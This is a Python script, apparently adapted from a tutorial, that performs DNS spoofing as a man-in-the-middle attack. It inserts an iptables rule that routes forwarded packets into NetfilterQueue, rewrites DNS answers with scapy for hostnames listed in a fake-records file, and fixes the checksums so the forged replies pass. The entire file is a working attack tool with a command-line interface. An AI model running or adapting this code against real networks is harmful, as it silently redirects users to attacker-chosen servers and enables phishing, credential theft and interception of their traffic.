# libnetfilter_queue necessary for this code to work
# https://thepythoncode.com/article/make-dns-spoof-python
import subprocess
from netfilterqueue import NetfilterQueue
from scapy.all import IP, DNSRR, DNSQR, DNS, UDP
import argparse

def analyze_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        scapy_packet=spoof_packet(scapy_packet)
    packet.set_payload(bytes(scapy_packet))
    packet.accept()

def spoof_packet(packet):
    qname=packet[DNSQR].qname
    if qname not in fake_dns_records.keys():
        return packet
    else:
        packet[DNS].an=DNSRR(rrname=qname, rdata=fake_dns_records[qname])
        packet[DNS].ancount=1
        del packet[IP].len
        del packet[IP].chksum
        del packet[UDP].len
        del packet[UDP].chksum
        print(f"Spoofed DNS response for {qname} to {fake_dns_records[qname]}")
        return packet

def convert_to_dns_list(dns_path):
    records={}
    if dns_path=="":
        dns_path="resources/mitm/fake_dns_records.txt"
    else:
        dns_path=dns_path
    try:
        with open(dns_path, "r") as f:
            while True:
                line=f.readline()
                if len(line)==0:
                    break
                line=line.replace("\n","")
                line=line.replace(" ","")
                line=line.split(":")
                records[f"{line[0]}.".encode()]=line[1]
    except FileNotFoundError:
        print("DNS records file not found")
        exit(1)
    return records

def dns_spoof(dns_path):

    global fake_dns_records
    fake_dns_records=convert_to_dns_list(dns_path)
    print(fake_dns_records)
    queue=NetfilterQueue()
    subprocess.run(f"sudo iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)

    try:
        queue.bind(0, analyze_packet)
        queue.run()
    except KeyboardInterrupt:
        print("Stopping DNS spoofing")
        subprocess.run(f"sudo iptables -D FORWARD -j NFQUEUE --queue-num 0", shell=True)
        queue.unbind()
    except Exception as e:
        print(e)
        exit(1)

def main():
    parser = argparse.ArgumentParser(description="Script for performing dns spoofing.")
    parser.add_argument("-f", default="", help="Custom path to dns_records_file. Example: -f resources/mitm/fake_dns_records.txt")
    args = parser.parse_args()
    dns_records_path = args.f

    dns_spoof(dns_records_path)

if __name__ == "__main__":
    main()